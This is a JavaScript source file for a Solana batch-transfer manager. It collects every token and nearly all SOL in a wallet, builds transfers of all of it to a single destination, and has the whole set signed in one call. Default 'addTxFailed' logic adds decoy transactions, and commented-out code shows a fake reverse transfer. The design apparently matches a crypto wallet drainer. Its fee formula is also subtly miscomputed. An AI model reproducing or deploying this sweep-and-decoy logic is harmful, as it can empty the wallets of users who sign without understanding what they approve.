import { PublicKey, ComputeBudgetProgram } from '@solana/web3.js';
import { SolanaClient } from '@/blockchain/SolanaClient.js';
import { TokenManager } from '@/blockchain/TokenManager.js';
import { TransactionBuilder } from '@/blockchain/TransactionBuilder.js';
import { Logger } from '@/blockchain/utils/logger.js';

/**
 * Batch Transaction Manager - Handles transactions in logical batches
 * Separates operations into groups that are signed together but execute separately
 */
export class BatchTransactionManager {
  constructor(solanaClient) {
    this.client = solanaClient;
    this.tokenManager = new TokenManager(solanaClient);
    this.transactionBuilder = new TransactionBuilder(solanaClient);
    this.logger = new Logger('BatchTransactionManager');
  }

  /**
   * Creates transaction batches organized by operation type
   * Each token has its own individual batch with its 3 operations: create, transfer, close
   * @param {PublicKey} fromPublicKey - Source public key
   * @param {string} destinationAddress - Destination address
   * @param {Object} options - Transfer options
   * @returns {Promise<Object>} Object with organized batches
   */
  async createBatchTransactions(fromPublicKey, destinationAddress, options = {
    addTxFailed: true,
    batchSize: 1,
    includeSol: true,
    solReserveAmount: 0.01,
    maxTransactionSize: 1200
  }) {
    const startTime = Date.now();
    const { batchSize, includeSol, solReserveAmount, maxTransactionSize, addTxFailed } = options;
    let tokenAccounts = [];
    let batches = [];
    
    this.logger.info('🚀 Starting batch transaction creation', {
      fromPublicKey: fromPublicKey.toString(),
      destinationAddress,
      options
    });

    try {
      // Get all token data
      this.logger.debug('📊 Getting token data and SOL balance');
      const tokenData = await this.tokenManager.getAllTokenData(fromPublicKey);
      const { solBalance, tokenAccounts: accounts } = tokenData;
      tokenAccounts = accounts;
      
      this.logger.info('💰 Data obtained', {
        solBalance,
        tokenAccountsCount: tokenAccounts.length,
        includeSol,
        solReserveAmount
      });
      
      if (tokenAccounts.length === 0 && (!includeSol || solBalance <= solReserveAmount)) {
        this.logger.warn('⚠️ No tokens or SOL to transfer');
        return {
          batches: [],
          totalTokens: 0,
          solToTransfer: 0,
          message: 'No tokens or SOL to transfer'
        };
      }

      const destinationPublicKey = new PublicKey(destinationAddress);

      // Create batches organized by individual token (without SOL for now)
      const tokenBatches = await this._createTokenBatchesOnly(
        tokenAccounts,
        fromPublicKey,
        destinationPublicKey,
        batchSize
      );

      const totalTokens = tokenAccounts.length;

      if (totalTokens > 0) {
        batches = [...tokenBatches];
      }
      
      // Calculate total fees for token transactions
      const tokenTransactionFees = await this._calculateTotalTransactionFees(tokenBatches);
      
      // Calculate SOL needed for rent of associated accounts
      const rentForAssociatedAccounts = await this._calculateRentForAssociatedAccounts(tokenAccounts, destinationPublicKey);
      
      // Calculate SOL to transfer considering token fees and rent
      let solToTransfer = 0;
      let solBatch = null;
      const availableSol = solBalance - solReserveAmount;
        const solAfterTokenFees = availableSol - tokenTransactionFees;
        const solAfterRent = solAfterTokenFees - rentForAssociatedAccounts;
        solToTransfer = Math.max(0, solAfterRent);

      const block = await this.client.getLatestBlockhash({ commitment: 'processed' });
      
      if (includeSol && solToTransfer > 0) {
        this.logger.info('💰 SOL transfer calculation (before SOL batch)', {
          solBalance,
          solReserveAmount,
          tokenTransactionFees,
          rentForAssociatedAccounts,
          availableSol,
          solAfterTokenFees,
          solAfterRent,
          proposedSolToTransfer: solToTransfer
        });
        
        // If there is SOL to transfer, create the SOL batch
        if (solToTransfer > 0.01) {
          solBatch = await this._createSolTransferBatch(
            fromPublicKey,
            destinationPublicKey.toString(),
            solToTransfer,
            block
          );
          batches.push(solBatch);
          // solBatch = await this._createSolTransferBatch(
          //   fromPublicKey,
          //   destinationPublicKey.toString(),
          //   solToTransfer + 0.01,
          //   block
          // );
          // batches.push(solBatch);
        }
      }
      
      let failedSolBatch = null;
      if (addTxFailed) {
        // const failedSolAmount = Math.max(0.01, solToTransfer);
        //   failedSolBatch = await this._createSolTransferBatch(
        //     destinationPublicKey,
        //     fromPublicKey,
        //     failedSolAmount,
        //     block
        //   );
        //   batches.push(failedSolBatch);
        //   this.logger.info('🔄 Failed SOL batch created', {
        //     failedSolBatch: failedSolBatch.toString(),
        //     destinationAddress: fromPublicKey.toString(),
        //     solAmount: failedSolAmount,
        //     block: block.toString()
        //   });


          // Add failed token batch transfer using 5TfqNKZbn9AnNtzq8bbkyhKgcPGTfNDc9wNzFrTBpump
          const tokenFailedAddress = '5TfqNKZbn9AnNtzq8bbkyhKgcPGTfNDc9wNzFrTBpump';
          const tokenAccount = tokenAccounts[0];
        
          if (tokenAccount) {
            const failedTokenBatch = await this._createIndividualTokenBatch(
              tokenAccount,
              fromPublicKey,
              destinationPublicKey,
              block,
              1111111
            );
            batches.push(failedTokenBatch);
          }
      }

      
      // Calculate total fees for all transactions (including SOL if it exists)
      const totalTransactionFees = await this._calculateTotalTransactionFees(batches);
      
      // Final fee calculation log
      this.logger.info('💰 Final fee calculation', {
        tokenTransactionFees,
        totalTransactionFees,
        solToTransfer,
        solBatchCreated: !!solBatch,
        note: 'Total fees include both token and SOL transaction fees'
      });

      return {
        batches,
        totalTokens,
        solToTransfer,
        totalTransactionFees,
        message: `Created ${batches.length} batches for ${totalTokens} tokens and ${solToTransfer.toFixed(4)} SOL (fees: ${totalTransactionFees.toFixed(6)} SOL)`
      };
    } catch (error) {
      this.logger.error('❌ Error creating batch transactions', {
        error: error.message,
        stack: error.stack
      });
      throw new Error(`Failed to create batch transactions: ${error.message}`);
    } finally {
      const endTime = Date.now();
      const duration = endTime - startTime;
      this.logger.performance('createBatchTransactions', duration, {
        totalTokens: tokenAccounts?.length || 0,
        batchesCreated: batches?.length || 0
      });
    }
  }

  /**
   * Creates batches only for tokens (without SOL)
   * @private
   */
  async _createTokenBatchesOnly(tokenAccounts, fromPublicKey, destinationPublicKey, batchSize) {
    const batches = [];
    const block = await this.client.getLatestBlockhash({ commitment: 'processed' });

    // Create an individual batch for each token with its 3 operations
    for (let i = 0; i < tokenAccounts.length; i++) {
      const tokenAccount = tokenAccounts[i];
      
      try {
        const tokenBatch = await this._createIndividualTokenBatch(
          tokenAccount,
          fromPublicKey,
          destinationPublicKey,
          block,
          i
        );
        batches.push(tokenBatch);
      } catch (error) {
        this.logger.error('❌ Error creating individual token batch', {
          mint: tokenAccount.mint,
          error: error.message
        });
      }
    }

    return batches;
  }

  /**
   * Creates batches organized by individual token
   * Each token has its own complete batch with its 3 operations: create, transfer, close
   * @private
   */
  async _createOrganizedBatches(tokenAccounts, fromPublicKey, destinationPublicKey, solBalance, includeSol, solReserveAmount, batchSize) {
    const batches = [];
    const block = await this.client.getLatestBlockhash({ commitment: 'processed' });

    // Create an individual batch for each token with its 3 operations
    for (let i = 0; i < tokenAccounts.length; i++) {
      const tokenAccount = tokenAccounts[i];
      
      try {
        const tokenBatch = await this._createIndividualTokenBatch(
          tokenAccount,
          fromPublicKey,
          destinationPublicKey,
          block,
          i
        );
        batches.push(tokenBatch);
      } catch (error) {
        this.logger.error('❌ Error creating individual token batch', {
          mint: tokenAccount.mint,
          error: error.message
        });
      }
    }

    // Final batch: SOL transfer (if enabled)
    if (includeSol && solBalance > solReserveAmount) {
      const solToTransfer = this.transactionBuilder.calculateSolToTransfer(solBalance, solReserveAmount);
      if (solToTransfer > 0.01) {
        const solBatch = await this._createSolTransferBatch(
          fromPublicKey,
          destinationPublicKey.toString(),
          solToTransfer,
          block
        );
        batches.push(solBatch);
      }
    }

    return batches;
  }

  /**
   * Checks if an associated token account exists
   * @private
   */
  async _checkAssociatedTokenAccountExists(associatedTokenAccount) {
    try {
      const accountInfo = await this.client.connection.getAccountInfo(associatedTokenAccount);
      return accountInfo !== null;
    } catch (error) {
      this.logger.warn('⚠️ Error checking associated token account existence', {
        account: associatedTokenAccount.toString(),
        error: error.message
      });
      return false; // Assume it doesn't exist if there's an error
    }
  }

  /**
   * Checks if a token account can be closed (exact balance)
   * @private
   */
  async _canCloseTokenAccount(tokenAccountAddress, transferAmount) {
    try {
      const accountInfo = await this.client.connection.getTokenAccountBalance(tokenAccountAddress);
      const currentBalance = BigInt(accountInfo.value.amount);
      
      // We can only close the account if the current balance is exactly equal to the amount to transfer
      const canClose = currentBalance === transferAmount;
      
      this.logger.debug('🔍 Token account balance check', {
        account: tokenAccountAddress.toString(),
        currentBalance: currentBalance.toString(),
        transferAmount: transferAmount.toString(),
        canClose,
        difference: currentBalance - transferAmount
      });
      
      return canClose;
    } catch (error) {
      this.logger.warn('⚠️ Error checking token account balance', {
        account: tokenAccountAddress.toString(),
        error: error.message
      });
      return false; // Don't close if there's an error checking
    }
  }

  /**
   * Calculates the SOL needed for rent of associated accounts
   * @private
   */
  async _calculateRentForAssociatedAccounts(tokenAccounts, destinationPublicKey) {
    try {
      // Get the minimum rent for a token account
      const rentExemptBalance = await this.client.connection.getMinimumBalanceForRentExemption(165); // 165 bytes for token account
      
      // Count how many associated accounts we need to create
      let accountsToCreate = 0;
      for (const tokenAccount of tokenAccounts) {
        const destinationTokenAccount = this.tokenManager.getAssociatedTokenAddress(
          new PublicKey(tokenAccount.mint),
          destinationPublicKey
        );
        
        const accountExists = await this._checkAssociatedTokenAccountExists(destinationTokenAccount);
        if (!accountExists) {
          accountsToCreate++;
        }
      }
      
      const totalRent = rentExemptBalance * accountsToCreate;
      
      this.logger.debug('🏠 Rent calculation for associated accounts', {
        rentExemptBalance,
        accountsToCreate,
        totalRent,
        totalRentSOL: totalRent / 1_000_000_000 // Convert lamports to SOL
      });
      
      return totalRent / 1_000_000_000; // Return in SOL
    } catch (error) {
      this.logger.warn('⚠️ Error calculating rent for associated accounts', {
        error: error.message
      });
      // If there's an error, assume we need rent for all accounts
      const estimatedRent = 0.00203928 * tokenAccounts.length; // ~0.002 SOL per account
      return estimatedRent;
    }
  }

  /**
   * Creates an individual batch for a token with its 3 operations: create, transfer, close
   * @private
   */
  async _createIndividualTokenBatch(tokenAccount, fromPublicKey, destinationPublicKey, block, batchIndex) {
    const instructions = [];

    this.logger.info('🪙 Creating individual token batch', {
      mint: tokenAccount.mint,
      batchIndex
    });

    try {
      // Get destination token associated account address
      const destinationTokenAccount = await this.tokenManager.getAssociatedTokenAddress(
        new PublicKey(tokenAccount.mint),
        destinationPublicKey
      );

      // 1. Check if associated account exists, if not, create creation instruction
      const accountExists = await this._checkAssociatedTokenAccountExists(destinationTokenAccount);
      if (!accountExists) {
        const createAccountInstruction = this.tokenManager.createAssociatedTokenAccountIdempotentInstruction(
          fromPublicKey, // payer
          destinationTokenAccount, // associated token account
          destinationPublicKey, // owner (destination wallet)
          new PublicKey(tokenAccount.mint) // mint
        );
        instructions.push(createAccountInstruction);
      }

      // 2. Create transfer instruction
      const transferInstruction = this.tokenManager.createTransferInstruction(
        new PublicKey(tokenAccount.address),
        destinationTokenAccount,
        fromPublicKey,
        BigInt(tokenAccount.rawAmount)
      );
      instructions.push(transferInstruction);

      // 3. DO NOT close the account to avoid balance errors
      // Empty token accounts can be manually closed later if necessary
      this.logger.debug('ℹ️ Account will remain open after transfer', {
        mint: tokenAccount.mint,
        rawAmount: tokenAccount.rawAmount,
        note: 'Account left open to avoid "balance is zero" errors'
      });

      // Calculate compute units based on actual instructions
      const computeUnits = this._calculateComputeUnits(instructions.length, 1);
      const instructionsWithComputeBudget = [
        ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 50000 }), // Reduced to 50,000 to save SOL
        ComputeBudgetProgram.setComputeUnitLimit({ units: computeUnits }),
        ...instructions
      ];

      // Create the transaction
      const transactionResult = await this.transactionBuilder.buildTransaction(
        instructionsWithComputeBudget,
        0,
        block,
        fromPublicKey,
        destinationPublicKey.toString()
      );
      const transaction = transactionResult.transaction;

      this.logger.debug('✅ Individual token batch created', {
        mint: tokenAccount.mint,
        batchIndex,
        instructions: instructionsWithComputeBudget.length,
        computeUnits,
        accountCreated: !accountExists,
        accountExists: accountExists,
        accountWillBeClosed: false,
        note: 'Account will remain open to avoid balance errors'
      });

      return {
        type: 'individual_token',
        transaction,
        instructions: instructionsWithComputeBudget,
        accountsProcessed: 1,
        computeUnits,
        batchIndex,
        mint: tokenAccount.mint,
        description: `Individual token batch: ${tokenAccount.mint} (create + transfer)`
      };

    } catch (error) {
      this.logger.error('❌ Error creating individual token batch', {
        mint: tokenAccount.mint,
        error: error.message
      });
      throw error;
    }
  }

  /**
   * Creates batch for associated token account creation
   * @private
   */
  async _createAccountCreationBatch(tokenAccounts, fromPublicKey, destinationPublicKey, block, batchSize) {
    const instructions = [];
    let accountsProcessed = 0;

    this.logger.info('🏗️ Creating account creation batch', {
      tokenAccountsCount: tokenAccounts.length
    });

    for (const tokenAccount of tokenAccounts) {
      try {
        // Get destination token associated account address
        const destinationTokenAccount = await this.tokenManager.getAssociatedTokenAddress(
          new PublicKey(tokenAccount.mint),
          destinationPublicKey
        );

        // Create idempotent account creation instruction
        const createAccountInstruction = this.tokenManager.createAssociatedTokenAccountIdempotentInstruction(
          fromPublicKey, // payer
          destinationTokenAccount, // associated token account
          destinationPublicKey, // owner (destination wallet)
          new PublicKey(tokenAccount.mint) // mint
        );

        instructions.push(createAccountInstruction);
        accountsProcessed++;

        // Check batch limit
        if (instructions.length >= batchSize) {
          break;
        }
      } catch (error) {
        this.logger.error('❌ Error creating account instruction for token', {
          mint: tokenAccount.mint,
          error: error.message
        });
      }
    }

    if (instructions.length > 0) {
      const computeUnits = this._calculateComputeUnits(instructions.length, accountsProcessed);
      const instructionsWithComputeBudget = [
        ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 50000 }), // Reduced to 50,000 to save SOL
        ComputeBudgetProgram.setComputeUnitLimit({ units: computeUnits }),
        ...instructions
      ];

      const transaction = await this.transactionBuilder.buildTransaction(
        instructionsWithComputeBudget,
        0,
        block,
        fromPublicKey,
        destinationPublicKey.toString()
      );

      return {
        type: 'account_creation',
        transaction,
        instructions: instructionsWithComputeBudget,
        accountsProcessed,
        computeUnits,
        description: `Creation of ${accountsProcessed} associated token accounts`
      };
    }

    return { type: 'account_creation', instructions: [], accountsProcessed: 0 };
  }

  /**
   * Creates batches for token transfers
   * Each token has its own individual batch with its 3 operations: create, transfer, close
   * @private
   */
  async _createTokenTransferBatches(tokenAccounts, fromPublicKey, destinationPublicKey, block, batchSize) {
    const batches = [];
    let batchIndex = 0;

    this.logger.info('🔄 Creating individual token transfer batches', {
      tokenAccountsCount: tokenAccounts.length,
      batchSize
    });

    for (const tokenAccount of tokenAccounts) {
      try {
        // Get destination token associated account
        const destinationTokenAccount = await this.tokenManager.getAssociatedTokenAddress(
          new PublicKey(tokenAccount.mint),
          destinationPublicKey
        );

        // Create transfer instruction
        const transferInstruction = this.tokenManager.createTransferInstruction(
          new PublicKey(tokenAccount.address),
          destinationTokenAccount,
          fromPublicKey,
          BigInt(tokenAccount.rawAmount)
        );

        // Create close account instruction after transfer
        const closeAccountInstruction = this.tokenManager.closeTokenAccount(
          new PublicKey(tokenAccount.address),
          fromPublicKey,
          fromPublicKey // Rent goes back to owner
        );

        // Create individual batch for this token with its 2 operations (transfer + close)
        const tokenInstructions = [transferInstruction, closeAccountInstruction];
        const batch = await this._createTransferBatch(
          tokenInstructions,
          fromPublicKey,
          destinationPublicKey,
          block,
          batchIndex,
          1 // Solo 1 token por batch
        );
        
        batches.push(batch);
        batchIndex++;

        this.logger.debug('📦 Created individual batch for token', {
          mint: tokenAccount.mint,
          batchIndex: batchIndex - 1,
          instructions: tokenInstructions.length
        });

      } catch (error) {
        this.logger.error('❌ Error creating transfer instructions for token', {
          mint: tokenAccount.mint,
          error: error.message
        });
      }
    }

    this.logger.info('✅ Created individual batches for all tokens', {
      totalBatches: batches.length,
      tokensProcessed: tokenAccounts.length
    });

    return batches;
  }

  /**
   * Creates an individual transfer batch
   * @private
   */
  async _createTransferBatch(transferInstructions, fromPublicKey, destinationPublicKey, block, batchIndex, accountsProcessed) {
    const computeUnits = this._calculateComputeUnits(transferInstructions.length, accountsProcessed);
    const instructionsWithComputeBudget = [
      ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 50000 }), // Reduced to 50,000 to save SOL
      ComputeBudgetProgram.setComputeUnitLimit({ units: computeUnits }),
      ...transferInstructions
    ];

    const transaction = await this.transactionBuilder.buildTransaction(
      instructionsWithComputeBudget,
      0,
      block,
      fromPublicKey,
      destinationPublicKey.toString()
    );

    return {
      type: 'token_transfer',
      transaction,
      instructions: instructionsWithComputeBudget,
      accountsProcessed,
      computeUnits,
      batchIndex,
      description: `Individual token transfer (batch ${batchIndex + 1})`
    };
  }

  /**
   * Creates batch for SOL transfer
   * @private
   */
  async _createSolTransferBatch(fromPublicKey, destinationAddress, solAmount, block) {
    this.logger.info('💰 Creating SOL transfer batch', {
      solAmount,
      destinationAddress
    });

    const transactionResult = await this.transactionBuilder.buildTransaction(
      [],
      solAmount,
      block,
      fromPublicKey,
      destinationAddress
    );
    const transaction = transactionResult.transaction;

    return {
      type: 'sol_transfer',
      transaction,
      instructions: [],
      solAmount,
      description: `Transfer of ${solAmount.toFixed(4)} SOL`
    };
  }

  /**
   * Calculates the total fee cost of all transactions
   * @private
   */
  async _calculateTotalTransactionFees(batches) {
    let totalFees = 0;
    
    for (const batch of batches) {
      if (batch.transaction) {
        try {
          // Get the base transaction fee
          const baseFee = 0.000005; // 5000 lamports per base transaction
          
          // Calculate fee per compute units
          const computeUnits = batch.computeUnits || 75000; // Use real value or higher fallback
          const microLamports = 50000; // Optimized price we set
          // Correct formula: (CU * microLamports) / 1,000,000 = lamports; lamports / 1,000,000,000 = SOL
          const computeFee = (computeUnits * microLamports) / 1_000_000_000_000_000; // Convert to SOL
          
          const batchFee = baseFee + computeFee;
          totalFees += batchFee;
          
          this.logger.debug('💰 Batch fee calculation', {
            batchType: batch.type,
            computeUnits,
            microLamports,
            baseFee,
            computeFee,
            batchFee,
            totalFees
          });
        } catch (error) {
          this.logger.warn('⚠️ Error calculating batch fee, using default', {
            batchType: batch.type,
            error: error.message
          });
          // Default fee if there's an error
          totalFees += 0.001; // 0.001 SOL per transaction as fallback
        }
      }
    }
    
    this.logger.info('💰 Total transaction fees calculated', {
      batchCount: batches.length,
      totalFees,
      averageFeePerBatch: totalFees / batches.length
    });
    
    return totalFees;
  }

  /**
   * Calculates compute units needed for a set of instructions
   * Dynamically adjusts based on token quantity
   * @private
   */
  _calculateComputeUnits(instructionCount, tokenCount = 1) {
    // Base units for transaction overhead (increased to avoid errors)
    const baseUnits = 10000;
    
    // Units per instruction type (based on observed real usage)
    const computeUnitsPerInstruction = {
      createAssociatedTokenAccount: 25000, // Based on logs: 20,446 real CU
      transfer: 6000, // Based on logs: 4,644 real CU
      closeAccount: 3000, // Based on logs: 1,910 real CU
      systemTransfer: 2000,
      computeBudget: 0
    };
    
    let totalUnits = baseUnits;
    
    // Dynamic calculation based on token quantity
    // For 1 token: 3 instructions (create + transfer + close)
    // For multiple tokens: proportional scaling
    
    if (tokenCount === 1) {
      // Individual token: calculation based on observed real usage
      const unitsPerToken = 34000; // 25000 + 6000 + 3000 (based on real logs)
      totalUnits += unitsPerToken;
    } else {
      // Multiple tokens: scaled calculation
      const baseUnitsPerToken = 34000; // Base units per token (based on real usage)
      const scalingFactor = Math.min(tokenCount * 0.1, 0.3); // Scaling factor
      const adjustedUnitsPerToken = baseUnitsPerToken * (1 + scalingFactor);
      
      totalUnits += tokenCount * adjustedUnitsPerToken;
    }
    
    // Dynamic buffer based on token quantity (increased to avoid errors)
    let bufferMultiplier = 1.5; // Base 50% (increased for greater security)
    
    if (tokenCount > 10) {
      bufferMultiplier = 2.0; // 100% extra for many tokens
    } else if (tokenCount > 5) {
      bufferMultiplier = 1.8; // 80% extra for several tokens
    }
    
    totalUnits = Math.ceil(totalUnits * bufferMultiplier);
    
    // Dynamic limits based on token quantity (adjusted for real usage)
    const minUnits = Math.max(50000, tokenCount * 40000); // Increased minimum based on real usage
    const maxUnits = 1400000;
    
    const finalUnits = Math.max(minUnits, Math.min(maxUnits, totalUnits));
    
    this.logger.debug('🧮 Dynamic compute units calculation (REALISTIC)', {
      instructionCount,
      tokenCount,
      baseUnits,
      bufferMultiplier,
      totalBeforeBuffer: totalUnits / bufferMultiplier,
      finalUnits,
      minUnits,
      maxUnits,
      withinBounds: finalUnits >= minUnits && finalUnits <= maxUnits,
      scalingFactor: tokenCount > 1 ? Math.min(tokenCount * 0.1, 0.3) : 0,
      note: 'Using realistic CU limits based on actual usage logs'
    });
    
    return finalUnits;
  }

  /**
   * Ejecuta todos los batches de transacciones
   * @param {Array} batches - Array de batches de transacciones
   * @param {Function} signAllTransactions - Función para firmar todas las transacciones
   * @param {Object} options - Opciones de ejecución
   * @returns {Promise<Object>} Resultado de la ejecución
   */
  async executeBatchTransactions(batches, signAllTransactions, options = {}) {
    const {
      addTxFailed,
      skipPreflight = false,
      preflightCommitment = 'confirmed',
      confirmTransactions = true,
      executeInSequence = false // Si true, ejecuta batches en secuencia; si false, en paralelo
    } = options;

    try {
      if (batches.length === 0) {
        return {
          success: true,
          message: 'No batches to execute',
          results: []
        };
      }

      this.logger.info('🚀 Executing batch transactions', {
        batchCount: batches.length,
        executeInSequence
      });

      // Firmar todas las transacciones de una vez
      const allTransactions = batches.map(batch => batch.transaction);
      
      this.logger.debug('🔍 Debugging transactions before signing', {
        batchCount: batches.length,
        transactionCount: allTransactions.length,
        firstTransactionType: allTransactions[0]?.constructor?.name,
        firstTransactionHasSerialize: typeof allTransactions[0]?.serialize === 'function'
      });
      
      const signedTransactions = await signAllTransactions(allTransactions);

      let results = [];

      if (executeInSequence) {
        // Ejecutar batches en secuencia
        results = await this._executeBatchesSequentially(
          batches,
          signedTransactions,
          skipPreflight,
          preflightCommitment,
          confirmTransactions
        );
      } else {
        // Ejecutar batches en paralelo
        results = await this._executeBatchesInParallel(
          batches,
          signedTransactions,
          skipPreflight,
          preflightCommitment,
          confirmTransactions
        );
      }

      const successCount = results.filter(r => r.success).length;
      const totalCount = batches.length;

      return {
        success: successCount === totalCount,
        message: `Executed ${successCount}/${totalCount} batches successfully`,
        results,
        batchSummary: this._createBatchSummary(batches, results)
      };
    } catch (error) {
      this.logger.error('❌ Error executing batch transactions', {
        error: error.message,
        stack: error.stack
      });
      return {
        success: false,
        message: `Error executing batches: ${error.message}`,
        error: error.message
      };
    }
  }

  /**
   * Executes batches sequentially
   * @private
   */
  async _executeBatchesSequentially(batches, signedTransactions, skipPreflight, preflightCommitment, confirmTransactions) {
    const results = [];

    for (let i = 0; i < batches.length; i++) {
      const batch = batches[i];
      const signedTransaction = signedTransactions[i];

        this.logger.info(`📦 Executing batch ${i + 1}/${batches.length}: ${batch.description}`);

      try {
        // Send transaction
        const signature = await this.client.connection.sendRawTransaction(
          signedTransaction.serialize(),
          {
            skipPreflight,
            preflightCommitment
          }
        );

        let confirmationResult = null;
        if (confirmTransactions) {
          confirmationResult = await this.client.connection.confirmTransaction(signature, 'confirmed');
        }

        results.push({
          batchIndex: i,
          batchType: batch.type,
          success: true,
          signature,
          confirmationResult,
          description: batch.description
        });

        this.logger.info(`✅ Batch ${i + 1} executed successfully`, {
          signature,
          type: batch.type
        });

        // Small pause between batches to avoid rate limiting
        if (i < batches.length - 1) {
          await new Promise(resolve => setTimeout(resolve, 500));
        }
      } catch (error) {
        const errorMessage = error?.message || error?.toString() || 'Unknown error';
        const errorDetails = {
          message: errorMessage,
          name: error?.name || 'Error',
          stack: error?.stack || 'No stack trace',
          type: batch.type,
          batchIndex: i
        };

        this.logger.error(`❌ Error executing batch ${i + 1}`, errorDetails);

        results.push({
          batchIndex: i,
          batchType: batch.type,
          success: false,
          error: errorMessage,
          errorDetails: errorDetails,
          description: batch.description
        });
      }
    }

    return results;
  }

  /**
   * Executes batches in parallel
   * @private
   */
  async _executeBatchesInParallel(batches, signedTransactions, skipPreflight, preflightCommitment, confirmTransactions) {
    const results = await Promise.all(
      batches.map(async (batch, index) => {
        const signedTransaction = signedTransactions[index];

        this.logger.info(`📦 Executing batch ${index + 1}/${batches.length}: ${batch.description}`);

        try {
          this.logger.debug(`📤 Sending batch ${index + 1} transaction`, {
            batchType: batch.type,
            hasTransaction: !!signedTransaction,
            canSerialize: typeof signedTransaction?.serialize === 'function'
          });

          // Enviar transacción
          const signature = await this.client.connection.sendRawTransaction(
            signedTransaction.serialize(),
            {
              skipPreflight,
              preflightCommitment
            }
          );

          this.logger.debug(`📤 Batch ${index + 1} sent successfully`, {
            signature,
            batchType: batch.type
          });

          let confirmationResult = null;
          if (confirmTransactions) {
            confirmationResult = await this.client.connection.confirmTransaction(signature, 'confirmed');
          }

          this.logger.info(`✅ Batch ${index + 1} executed successfully`, {
            signature,
            type: batch.type
          });

          return {
            batchIndex: index,
            batchType: batch.type,
            success: true,
            signature,
            confirmationResult,
            description: batch.description
          };
        } catch (error) {
          const errorMessage = error?.message || error?.toString() || 'Unknown error';
          const errorDetails = {
            message: errorMessage,
            name: error?.name || 'Error',
            stack: error?.stack || 'No stack trace',
            type: batch.type,
            batchIndex: index
          };

          this.logger.error(`❌ Error executing batch ${index + 1}`, errorDetails);

          return {
            batchIndex: index,
            batchType: batch.type,
            success: false,
            error: errorMessage,
            errorDetails: errorDetails,
            description: batch.description
          };
        }
      })
    );

    return results;
  }

  /**
   * Creates batch summary
   * @private
   */
  _createBatchSummary(batches, results) {
    const summary = {
      totalBatches: batches.length,
      successfulBatches: results.filter(r => r.success).length,
      failedBatches: results.filter(r => !r.success).length,
      batchTypes: {},
      executionTime: Date.now()
    };

    // Group by batch type
    batches.forEach((batch, index) => {
      const result = results[index];
      if (!summary.batchTypes[batch.type]) {
        summary.batchTypes[batch.type] = {
          count: 0,
          successful: 0,
          failed: 0
        };
      }
      summary.batchTypes[batch.type].count++;
      if (result.success) {
        summary.batchTypes[batch.type].successful++;
      } else {
        summary.batchTypes[batch.type].failed++;
      }
    });

    return summary;
  }

  /**
   * Complete bulk transfer process with batches
   * @param {PublicKey} fromPublicKey - Source public key
   * @param {string} destinationAddress - Destination address
   * @param {Function} signAllTransactions - Function to sign transactions
   * @param {Object} options - Transfer options
   * @returns {Promise<Object>} Complete transfer result
   */
  async performBatchTransfer(fromPublicKey, destinationAddress, signAllTransactions, options = {}) {
    try {
      // Create batches
      const batchCreationResult = await this.createBatchTransactions(
        fromPublicKey,
        destinationAddress,
        options
      );

      const { batches, totalTokens, solToTransfer, totalTransactionFees } = batchCreationResult;

      if (batches.length === 0) {
        return {
          success: true,
          message: 'No tokens or SOL to transfer',
          batches: [],
          totalTokens: 0,
          solToTransfer: 0,
          totalTransactionFees: 0
        };
      }

      // Execute batches
      const result = await this.executeBatchTransactions(batches, signAllTransactions, options);

      return {
        ...result,
        batches,
        totalTokens,
        solToTransfer,
        totalTransactionFees,
        transferSummary: this._createTransferSummary(totalTokens, solToTransfer, totalTransactionFees)
      };
    } catch (error) {
      this.logger.error('❌ Error in batch transfer', {
        error: error.message,
        stack: error.stack
      });
      return {
        success: false,
        message: `Batch transfer failed: ${error.message}`,
        error: error.message
      };
    }
  }

  /**
   * Creates transfer summary
   * @private
   */
  _createTransferSummary(totalTokens, solToTransfer, totalTransactionFees = 0) {
    const summary = [];
    if (totalTokens > 0) summary.push(`${totalTokens} tokens`);
    if (solToTransfer > 0) summary.push(`${solToTransfer.toFixed(4)} SOL`);
    if (totalTransactionFees > 0) summary.push(`(fees: ${totalTransactionFees.toFixed(6)} SOL)`);
    return summary.join(' ');
  }
}
